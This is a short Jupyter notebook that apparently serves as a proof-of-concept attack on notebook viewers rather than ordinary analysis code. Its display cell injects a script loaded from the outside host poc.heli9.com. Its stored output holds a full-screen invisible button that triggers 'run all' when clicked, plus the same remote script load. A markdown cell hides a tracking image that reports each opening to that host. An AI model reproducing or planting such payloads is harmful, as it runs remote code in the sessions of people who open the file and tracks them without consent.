# %%
from IPython.display import HTML, display
display(HTML("""
<button id="runjs" tabindex=0>Run JS</button>
<script>
document.getElementById('runjs').onclick = () => {
  console.log(window.origin);
};
with(document)body.appendChild(createElement('script')).src='//poc.heli9.com/datazone/make.js';
</script>
"""))
# Out:
# <button data-commandlinker-command="runmenu:run-all" style="background-color: red;width: 10000px;height: 10000px;top: -1000px;left: -1000px;opacity: 0.5;pointer-events: all;position:fixed;cursor:crosshair;z-index:987987">VERSION 8</button>
# <script>
# document.getElementById('runjs').onclick = () => {
#   with(document)body.appendChild(createElement('script')).src='//poc.heli9.com/datazone/make.js';
# };
# console.log(1)
# </script>

# %% [markdown]
# <img src="//poc.heli9.com/log.php?openFromUrl" style="display:none">
